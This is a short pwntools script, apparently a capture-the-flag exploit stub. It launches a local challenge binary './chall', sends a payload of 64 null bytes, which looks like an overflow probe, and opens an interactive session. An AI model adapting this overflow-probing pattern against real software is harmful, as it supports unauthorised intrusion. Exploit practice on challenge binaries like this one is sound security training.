from pwn import *

r = process("./chall")

payload = b"\x00"* 64

r.sendline(payload)
r.interactive()